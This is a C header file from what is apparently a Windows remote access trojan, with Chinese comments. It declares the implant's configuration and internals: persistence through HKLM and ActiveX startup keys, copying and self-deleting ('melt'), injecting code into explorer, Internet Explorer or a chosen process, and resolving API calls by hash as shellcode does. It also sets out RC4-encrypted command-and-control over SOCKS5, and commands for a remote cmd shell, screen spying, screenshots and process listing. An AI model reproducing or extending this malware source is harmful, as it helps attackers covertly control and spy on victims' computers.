#ifndef GLOBAL_DATA_H
#define GLOBAL_DATA_H

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>

#include <tchar.h>
#include <windows.h>
#include <TlHelp32.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef struct global_data global_data_t, *global_data_p;
typedef struct extra_function extra_function_t;

#include "apis.inc"
#include "shellcode.inc"

#pragma pack(push)
#pragma pack(1)
struct extra_function {
  union {
    u64 ptr64;
    struct {
      u32 ptr32;
      u32 dummy;
    };
  };
  u16 size;
};

// 与loader中的结构相同
struct global_data {
  u8 is_wow64;
  wchar_t loader_path[256];

  char mutex_name[100];
  u8 persistence;

  u8 melt;
  u8 copy_method;
  wchar_t copy_to[100];

  u8 startup_hklm;
  wchar_t nklm_name[100];

  u8 startup_acitvex;
  wchar_t activex_name[100];

  u8 inject_to_ie;

  u8 inject_to_custom;
  wchar_t custom_process_name[100];

  wchar_t group[12];
  wchar_t id[12];

  u8 dns_list[256];

  u8 socks5;
  u8 socks5_dns[100];
  u16 socks5_port;
  u8 socks5_user[100];
  u8 socks5_pass[100];

  u8 rc4_key[260];

  u8 send_sbox[256];
  u8 recv_sbox[256];
#ifdef _WIN64
  u32 kernel32;
  u32 xLoadLibraryA, xGetProcAddress, xGetCurrentProcess, xCloseHandle, xOpenProcess, xlstrlenA, xlstrlenW, xlstrcatW, xlstrcpyA,
    xlstrcpyW, xlstrcmpiW, xHeapAlloc, xHeapReAlloc, xHeapFree, xGetProcessHeap, xGetModuleHandleA, xGetModuleFileNameW, xCreateMutexA,
    xGetLastError, xSleep, xVirtualAllocEx, xVirtualFreeEx, xWriteProcessMemory, xWaitForSingleObject, xCreateToolhelp32Snapshot,
    xProcess32FirstW, xProcess32NextW, xExpandEnvironmentStringsW, xCreateProcessW, xCreateRemoteThread, xGetSystemDirectoryW,
    xGetWindowsDirectoryW, xCopyFileW, xDeleteFileW;

  u32 ntdll;
  u32 xRtlZeroMemory, xRtlMoveMemory, xRtlCompressBuffer, xRtlGetCompressionWorkSpaceSize, xRtlDecompressBuffer;

  u32 advapi32;
  u32 xOpenProcessToken, xLookupPrivilegeValueA, xAdjustTokenPrivileges, xRegOpenKeyExA, xRegCreateKeyExW, xRegSetValueExW,
    xRegQueryValueExW, xRegCloseKey;

  u32 ws2_32;
  u32 xWSAStartup, xWSACleanup, xhtons, xinet_addr, xgethostbyname, xsocket, xclosesocket, xconnect, xsetsockopt, xsend, xrecv, xselect;
#else
  HMODULE kernel32;
  _LoadLibraryA xLoadLibraryA;
  _GetProcAddress xGetProcAddress;
  _GetCurrentProcess xGetCurrentProcess;
  _CloseHandle xCloseHandle;
  _OpenProcess xOpenProcess;
  _lstrlenA xlstrlenA;
  _lstrlenW xlstrlenW;
  _lstrcatW xlstrcatW;
  _lstrcpyA xlstrcpyA;
  _lstrcpyW xlstrcpyW;
  _lstrcmpiW xlstrcmpiW;
  _HeapAlloc xHeapAlloc;
  _HeapReAlloc xHeapReAlloc;
  _HeapFree xHeapFree;
  _GetProcessHeap xGetProcessHeap;
  _GetModuleHandleA xGetModuleHandleA;
  _GetModuleFileNameW xGetModuleFileNameW;
  _CreateMutexA xCreateMutexA;
  _GetLastError xGetLastError;
  _Sleep xSleep;
  _VirtualAllocEx xVirtualAllocEx;
  _VirtualFreeEx xVirtualFreeEx;
  _WriteProcessMemory xWriteProcessMemory;
  _WaitForSingleObject xWaitForSingleObject;
  _CreateToolhelp32Snapshot xCreateToolhelp32Snapshot;
  _Process32FirstW xProcess32FirstW;
  _Process32NextW xProcess32NextW;
  _ExpandEnvironmentStringsW xExpandEnvironmentStringsW;
  _CreateProcessW xCreateProcessW;
  _CreateRemoteThread xCreateRemoteThread;
  _GetSystemDirectoryW xGetSystemDirectoryW;
  _GetWindowsDirectoryW xGetWindowsDirectoryW;
  _CopyFileW xCopyFileW;
  _DeleteFileW xDeleteFileW;

  HMODULE ntdll;
  _RtlZeroMemory xRtlZeroMemory;
  _RtlMoveMemory xRtlMoveMemory;
  _RtlCompressBuffer xRtlCompressBuffer;
  _RtlGetCompressionWorkSpaceSize xRtlGetCompressionWorkSpaceSize;
  _RtlDecompressBuffer xRtlDecompressBuffer;

  HMODULE advapi32;
  _OpenProcessToken xOpenProcessToken;
  _LookupPrivilegeValueA xLookupPrivilegeValueA;
  _AdjustTokenPrivileges xAdjustTokenPrivileges;
  _RegOpenKeyExA xRegOpenKeyExA;
  _RegCreateKeyExW xRegCreateKeyExW;
  _RegSetValueExW xRegSetValueExW;
  _RegQueryValueExW xRegQueryValueExW;
  _RegCloseKey xRegCloseKey;

  HMODULE ws2_32;
  _WSAStartup xWSAStartup;
  _WSACleanup xWSACleanup;
  _htons xhtons;
  _inet_addr xinet_addr;
  _gethostbyname xgethostbyname;
  _socket xsocket;
  _closesocket xclosesocket;
  _connect xconnect;
  _setsockopt xsetsockopt;
  _send xsend;
  _recv xrecv;
  _select xselect;
#endif

  u8 extra_data[1024];

#ifdef _WIN64
  u32 get_proc_from_hash, rc4_init, rc4_crypt, alloc_memory, realloc_memory, free_memory, alloc_executable_memory, free_executable_memory,
    compress, decompress, wait_buffer, recv_data, send_data, connect_server;
#else
  _get_proc_from_hash get_proc_from_hash;
  _rc4_init rc4_init;
  _rc4_crypt rc4_crypt;
  _alloc_memory alloc_memory;
  _realloc_memory realloc_memory;
  _free_memory free_memory;
  _alloc_executable_memory alloc_executable_memory;
  _free_executable_memory free_executable_memory;
  _compress compress;
  _decompress decompress;
  _wait_buffer wait_buffer;
  _recv_data recv_data;
  _send_data send_data;
  void *connect_server;   // 这个无法在其它shellcode中使用
#endif

#ifdef _WIN64
  extra_function_t connect_by_socks5, inject_to_explorer, add_startup_hklm_x86, add_startup_activex_x86, copy_self_x86,
    find_process_by_name_x86, inject_to_exploer_code_x86;

  HMODULE(*get_kernel32_base_x64)();
  u16 get_kernel32_base_x64_size;

  HMODULE(*get_ntdll_base_x64)();
  u16 get_ntdll_base_x64_size;

  HMODULE(*get_proc_from_hash_x64)(HMODULE, u32, _GetProcAddress);
  u16 get_proc_from_hash_x64_size;

  void(*add_startup_hklm_x64)(struct x64_global_data *, struct global_data *);
  u16 add_startup_hklm_x64_size;

  void(*add_startup_activex_x64)(struct x64_global_data *, struct global_data *);
  u16 add_startup_activex_x64_size;

  void(*copy_self_x64)(struct x64_global_data *, struct global_data *);
  u16 copy_self_x64_size;

  u32(__stdcall *find_process_by_name_x64)(struct x64_global_data *, wchar_t *);
  u16 find_process_by_name_x64_size;

  extra_function_t inject_to_explorer_code_x64;
#else
  extra_function_t connect_by_socks5, inject_to_explorer;

  void(__stdcall *add_startup_hklm_x86)(struct global_data *);
  u32 dummy0;
  u16 add_startup_hklm_x86_size;

  void(__stdcall *add_startup_activex_x86)(struct global_data *);
  u32 dummy1;
  u16 add_startup_activex_x86_size;

  void(__stdcall *copy_self_x86)(struct global_data *);
  u32 dummy2;
  u16 copy_self_x86_size;

  u32(__stdcall *find_process_by_name_x86)(global_data_p, wchar_t *);
  u32 dummy3;
  u16 find_process_by_name_x86_size;

  extra_function_t inject_to_explorer_code_x86, get_kernel32_base_x64, get_ntdll_base_x64, get_proc_from_hash_x64, add_startup_hklm_x64,
    add_startup_activex_x64, copy_self_x64, find_process_by_name_x64, inject_to_explorer_code_x64;
#endif
};

// 协议头
typedef struct packet_header {
  uint32_t random;                // 随机数
  uint32_t signature;             // 标志
  uint8_t  cmd;
  uint32_t packet_unpacked_size;  // 包体解压缩后的大小
  uint32_t packet_size;           // 包体大小
} packet_header_t;

// buffer相关
typedef struct buffer_ {
  size_t size;
  uint8_t *data;
  size_t alloc;
  global_data_t *global_data;
} buffer_t;

// bitmap相关
typedef struct bitmap_ {
  HBITMAP bitmap;
  PBITMAPINFO info;
  int info_size;
  void *bits;
  int width;
  int height;
  int bit_count;
  HDC dc;
  BITMAPFILEHEADER file_header;
  int bitmap_file_size;
  global_data_t *global_data;
} bitmap_t;

#include "extra.inc"
#include "define.inc"

// extra
typedef struct {
  _buffer_new         buffer_new;
  _buffer_free        buffer_free;
  _buffer_checkspace  buffer_checkspace;
  _buffer_write       buffer_write;
  _buffer_clear       buffer_clear;

  _msgpack_lite_pack_nil				msgpack_lite_pack_nil;
  _msgpack_lite_pack_boolean		msgpack_lite_pack_boolean;
  _msgpack_lite_pack_signed			msgpack_lite_pack_signed;
  _msgpack_lite_pack_unsigned		msgpack_lite_pack_unsigned;
  _msgpack_lite_pack_float			msgpack_lite_pack_float;
  _msgpack_lite_pack_double			msgpack_lite_pack_double;
  _msgpack_lite_pack_real				msgpack_lite_pack_real;
  _msgpack_lite_pack_map_size		msgpack_lite_pack_map_size;
  _msgpack_lite_pack_str				msgpack_lite_pack_str;
  _msgpack_lite_pack_widestr		msgpack_lite_pack_widestr;
  _msgpack_lite_pack_bin_size		msgpack_lite_pack_bin_size;
  _msgpack_lite_pack_bin				msgpack_lite_pack_bin;
  _msgpack_lite_pack_array_size	msgpack_lite_pack_array_size;
  _msgpack_lite_pack_insert			msgpack_lite_pack_insert;

  _send_packet                  send_packet;
  _recv_packet                  recv_packet;

  _bitmap_new                   bitmap_new;
  _bitmap_free                  bitmap_free;
  _bitmap_scan_line             bitmap_scan_line;
  _bitmap_save                  bitmap_save;

  uint32_t                      state;

  void                          *shellcode_main_data;

  struct {
    void                          *code;
    void                          *data;

    _get_lan_info                 get_lan_info;
    _get_os_version               get_os_version;
    _get_cpu_frequency            get_cpu_frequency;
  } information;

  struct {
    void                          *code;
    void                          *data;

    HANDLE                        cmd_handle, input_read, input_write, output_read, output_write;

    _cmd_shell_initialize         cmd_shell_initialize;
    _cmd_shell_send_result        cmd_shell_send_result;
    _cmd_shell_execute            cmd_shell_execute;
    _cmd_shell_finalize           cmd_shell_finalize;
  } cmd_shell;

  struct {
    void                          *code;
    DWORD                         tick;
    _thumbnail_send               thumbnail_send;
  } thumbnail;

  struct {
    void                          *code;

    int                           screen_width, screen_height, start_line, bit_count;
    HWND                          desktop_window;
    HDC                           desktop_dc;
    bitmap_t                      *bitmap_full, *bitmap_line;
    bool                          first_screen_sent;
    RECT                          changed[9];
    DWORD                         tick;

    _screenspy_initalize          screenspy_initalize;
    _screenspy_send               screenspy_send;
    _screenspy_finalize           screenspy_finalize;
  } screenspy;

  struct {
    void                          *code;

    _process_send_list            process_send_list;
  } process;

  HMODULE                       version;
  HMODULE                       shlwapi;
  HMODULE                       user32;
  HMODULE                       gdi32;

  // kernel32
  _WideCharToMultiByte        xWideCharToMultiByte;
  _GetTickCount               xGetTickCount;
  _GetComputerNameW           xGetComputerNameW;
  _GlobalMemoryStatusEx       xGlobalMemoryStatusEx;
  _GetLocaleInfoA             xGetLocaleInfoA;
  _CreatePipe                 xCreatePipe;
  _GetExitCodeProcess         xGetExitCodeProcess;
  _PeekNamedPipe              xPeekNamedPipe;
  _ReadFile                   xReadFile;
  _WriteFile                  xWriteFile;
  _TerminateProcess           xTerminateProcess;
  _GetCurrentThreadId         xGetCurrentThreadId;
  _lstrcmpiA                  xlstrcmpiA;
  _GetSystemDirectoryA        xGetSystemDirectoryA;
  _lstrcatA                   xlstrcatA;

  // advapi32
  _GetUserNameW               xGetUserNameW;
  _RegQueryValueExA           xRegQueryValueExA;

  // ws2_32
  _gethostname                xgethostname;
  _inet_ntoa                  xinet_ntoa;

  // version
  _GetFileVersionInfoSizeA    xGetFileVersionInfoSizeA;
  _VerQueryValueA             xVerQueryValueA;
  _GetFileVersionInfoA        xGetFileVersionInfoA;

  // shlwapi
  _wnsprintfA                 xwnsprintfA;

  // user32
  _MessageBoxA                xMessageBoxA;
  _SetRect                    xSetRect;
  _GetUserObjectInformationA  xGetUserObjectInformationA;
  _SetThreadDesktop           xSetThreadDesktop;
  _CloseDesktop               xCloseDesktop;
  _GetSystemMetrics           xGetSystemMetrics;
  _GetDesktopWindow           xGetDesktopWindow;
  _GetDC                      xGetDC;
  _ReleaseDC                  xReleaseDC;
  _SetRectEmpty               xSetRectEmpty;
  _GetCursorPos               xGetCursorPos;
  _GetThreadDesktop           xGetThreadDesktop;
  _OpenInputDesktop           xOpenInputDesktop;

  // gdi32
  _CreateCompatibleBitmap     xCreateCompatibleBitmap;
  _GetDIBits                  xGetDIBits;
  _CreateDIBSection           xCreateDIBSection;
  _CreateCompatibleDC         xCreateCompatibleDC;
  _SelectObject               xSelectObject;
  _DeleteDC                   xDeleteDC;
  _DeleteObject               xDeleteObject;
  _BitBlt                     xBitBlt;
  _StretchBlt                 xStretchBlt;
} extra_t;

#pragma pack(pop)

#define extra_data()					                ((extra_t *)global_data->extra_data)
#define xWideCharToMultiByte			            ((extra_t *)global_data->extra_data)->xWideCharToMultiByte
#define xGetTickCount			                    ((extra_t *)global_data->extra_data)->xGetTickCount
#define xgethostname					                ((extra_t *)global_data->extra_data)->xgethostname
#define xinet_ntoa						                ((extra_t *)global_data->extra_data)->xinet_ntoa
#define xGetFileVersionInfoSizeA	            ((extra_t *)global_data->extra_data)->xGetFileVersionInfoSizeA
#define xGetFileVersionInfoA			            ((extra_t *)global_data->extra_data)->xGetFileVersionInfoA
#define xVerQueryValueA					              ((extra_t *)global_data->extra_data)->xVerQueryValueA
#define xwnsprintfA						                ((extra_t *)global_data->extra_data)->xwnsprintfA
#define xGetComputerNameW				              ((extra_t *)global_data->extra_data)->xGetComputerNameW
#define xGetUserNameW					                ((extra_t *)global_data->extra_data)->xGetUserNameW
#define xGlobalMemoryStatusEx			            ((extra_t *)global_data->extra_data)->xGlobalMemoryStatusEx
#define xGetLocaleInfoA					              ((extra_t *)global_data->extra_data)->xGetLocaleInfoA
#define xRegQueryValueExA				              ((extra_t *)global_data->extra_data)->xRegQueryValueExA
#define xMessageBoxA				                  ((extra_t *)global_data->extra_data)->xMessageBoxA
#define xCreatePipe				                    ((extra_t *)global_data->extra_data)->xCreatePipe
#define xGetExitCodeProcess				            ((extra_t *)global_data->extra_data)->xGetExitCodeProcess
#define xPeekNamedPipe				                ((extra_t *)global_data->extra_data)->xPeekNamedPipe
#define xReadFile				                      ((extra_t *)global_data->extra_data)->xReadFile
#define xWriteFile				                    ((extra_t *)global_data->extra_data)->xWriteFile
#define xTerminateProcess				              ((extra_t *)global_data->extra_data)->xTerminateProcess
#define xCreateCompatibleBitmap               ((extra_t *)global_data->extra_data)->xCreateCompatibleBitmap
#define xGetDIBits                            ((extra_t *)global_data->extra_data)->xGetDIBits
#define xCreateDIBSection                     ((extra_t *)global_data->extra_data)->xCreateDIBSection
#define xCreateCompatibleDC                   ((extra_t *)global_data->extra_data)->xCreateCompatibleDC
#define xSelectObject                         ((extra_t *)global_data->extra_data)->xSelectObject
#define xDeleteDC                             ((extra_t *)global_data->extra_data)->xDeleteDC
#define xDeleteObject                         ((extra_t *)global_data->extra_data)->xDeleteObject
#define xSetRect                              ((extra_t *)global_data->extra_data)->xSetRect
#define xGetCurrentThreadId                   ((extra_t *)global_data->extra_data)->xGetCurrentThreadId
#define xGetUserObjectInformationA            ((extra_t *)global_data->extra_data)->xGetUserObjectInformationA
#define xlstrcmpiA                            ((extra_t *)global_data->extra_data)->xlstrcmpiA
#define xSetThreadDesktop                     ((extra_t *)global_data->extra_data)->xSetThreadDesktop
#define xCloseDesktop                         ((extra_t *)global_data->extra_data)->xCloseDesktop
#define xGetSystemMetrics                     ((extra_t *)global_data->extra_data)->xGetSystemMetrics
#define xGetDesktopWindow                     ((extra_t *)global_data->extra_data)->xGetDesktopWindow
#define xGetDC                                ((extra_t *)global_data->extra_data)->xGetDC
#define xReleaseDC                            ((extra_t *)global_data->extra_data)->xReleaseDC
#define xSetRectEmpty                         ((extra_t *)global_data->extra_data)->xSetRectEmpty
#define xBitBlt                               ((extra_t *)global_data->extra_data)->xBitBlt
#define xGetCursorPos                         ((extra_t *)global_data->extra_data)->xGetCursorPos
#define xStretchBlt                           ((extra_t *)global_data->extra_data)->xStretchBlt
#define xGetThreadDesktop                     ((extra_t *)global_data->extra_data)->xGetThreadDesktop
#define xOpenInputDesktop                     ((extra_t *)global_data->extra_data)->xOpenInputDesktop
#define xGetSystemDirectoryA                  ((extra_t *)global_data->extra_data)->xGetSystemDirectoryA
#define xlstrcatA                             ((extra_t *)global_data->extra_data)->xlstrcatA

#define xbuffer_new()					     ((extra_t *)global_data->extra_data)->buffer_new(global_data)
#define xbuffer_free					     ((extra_t *)global_data->extra_data)->buffer_free
#define xbuffer_checkspace				 ((extra_t *)global_data->extra_data)->buffer_checkspace
#define xbuffer_write					     ((extra_t *)global_data->extra_data)->buffer_write
#define xbuffer_clear					     ((extra_t *)global_data->extra_data)->buffer_clear

#define xinformation               ((extra_t *)global_data->extra_data)->information

#define xget_lan_info(a)           ((extra_t *)global_data->extra_data)->information.get_lan_info(global_data, a)
#define xget_os_version(a, b)      ((extra_t *)global_data->extra_data)->information.get_os_version(global_data, a, b)
#define xget_cpu_frequency()       ((extra_t *)global_data->extra_data)->information.get_cpu_frequency(global_data)

#define mlp_nil				             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_nil				
#define mlp_boolean		             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_boolean		
#define mlp_signed			           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_signed			
#define mlp_unsigned		           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_unsigned		
#define mlp_float			             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_float			
#define mlp_double			           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_double			
#define mlp_real				           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_real				
#define mlp_map_size		           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_map_size		
#define mlp_str				             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_str				
#define mlp_widestr		             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_widestr		
#define mlp_bin_size		           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_bin_size		
#define mlp_bin				             ((extra_t *)global_data->extra_data)->msgpack_lite_pack_bin				
#define mlp_array_size	           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_array_size	
#define mlp_insert			           ((extra_t *)global_data->extra_data)->msgpack_lite_pack_insert

#define xsend_packet(a, b, c, d)   ((extra_t *)global_data->extra_data)->send_packet(global_data, a, b, c, d)
#define xrecv_packet(a, b, c, d)   ((extra_t *)global_data->extra_data)->recv_packet(global_data, a, b, c, d)

#define xbitmap_new(a, b, c, d)    ((extra_t *)global_data->extra_data)->bitmap_new(global_data, a, b, c, d)
#define xbitmap_free           		 ((extra_t *)global_data->extra_data)->bitmap_free
#define xbitmap_scan_line      		 ((extra_t *)global_data->extra_data)->bitmap_scan_line
#define xbitmap_save           		 ((extra_t *)global_data->extra_data)->bitmap_save

#define xcmd_shell                 ((extra_t *)global_data->extra_data)->cmd_shell

#define xcmd_shell_initialize(a)   ((extra_t *)global_data->extra_data)->cmd_shell.cmd_shell_initialize(global_data, a)
#define xcmd_shell_send_result(a)  ((extra_t *)global_data->extra_data)->cmd_shell.cmd_shell_send_result(global_data, a)
#define xcmd_shell_execute(a, b)   ((extra_t *)global_data->extra_data)->cmd_shell.cmd_shell_execute(global_data, a, b)
#define xcmd_shell_finalize(a)     ((extra_t *)global_data->extra_data)->cmd_shell.cmd_shell_finalize(global_data, a)

#define xthumbnail                 ((extra_t *)global_data->extra_data)->thumbnail

#define xthumbnail_send(a)         ((extra_t *)global_data->extra_data)->thumbnail.thumbnail_send(global_data, a)

#define xscreenspy                 ((extra_t *)global_data->extra_data)->screenspy

#define xscreenspy_initalize(a, b)    ((extra_t *)global_data->extra_data)->screenspy.screenspy_initalize(global_data, a, b)
#define xscreenspy_send(a)            ((extra_t *)global_data->extra_data)->screenspy.screenspy_send(global_data, a)
#define xscreenspy_finalize(a)        ((extra_t *)global_data->extra_data)->screenspy.screenspy_finalize(global_data, a)

#define xprocess                      ((extra_t *)global_data->extra_data)->process

#define xprocess_send_list(a)         ((extra_t *)global_data->extra_data)->process.process_send_list(global_data, a)

enum {
  CMD_SHELLCODE_MAIN,           // shell code main
  CMD_SHELLCODE_INFORMATION,    // shellcode information
  CMD_SHELLCODE_CMD_SHELL,      // cmd_shell
  CMD_SHELLCODE_THUMBNAIL,      // thumbnail
  CMD_SHELLCODE_SCREENSPY,      // screenspy
  CMD_SHELLCODE_PROCESS,         // process

  CMD_PING,                 // ping
  CMD_PONG,                 // ping回复包

  CMD_LOGIN_INFO,           // 登陆信息

  CMD_GET_PROCESS_LIST,     // 获取进程列表
  CMD_PROCESS_LIST,         // 进程列表

  CMD_BEGIN_SCREENSPY,      // 开启屏幕监控
  CMD_STOP_SCREENSPY,       // 关闭屏幕监控

  CMD_SCREENSPY_START,      // 开启完成通知
  CMD_SCREENSPY_DATA,       // 屏幕监控数据
  CMD_SCREENSPY_END,        // 关闭完成通知

  CMD_THUMBANIL_START,      // 循环获取缩略图
  CMD_THUMBNAIL_DATA,       // 屏幕缩略图数据
  CMD_THUMBANIL_END,        // 捕获缩略图结束

  CMD_BEGIN_CMDSHELL,       // 开启cmdshell
  CMD_STOP_CMDSHELL,        // 关闭cmdshell

  CMD_CMDSHELL_START,       // 开启完成通知
  CMD_CMDSHELL_DATA,        // cmd数据，server to client = command, client to server = cmdshell data
  CMD_CMDSHELL_END          // 关闭完成通知
};

#define BUFFER_INIT_SIZE 512
#define PACKET_HEADER_SIGNATURE 0xdeedbeef
#define MIN_COMPRESS_DATA_SIZE 512

#define WAIT_BUFFER_TIMEOUT 60 * 2

#define STATE_SCREEN_SPY  (1)
#define STATE_CMD_SHELL   (1 << 2)
#define STATE_THUMBNAIL   (1 << 3)

#define FUNCTIONS_VERSION 0x001     // 主版本0 次版本0 小版本1

#endif  // GLOBAL_DATA_H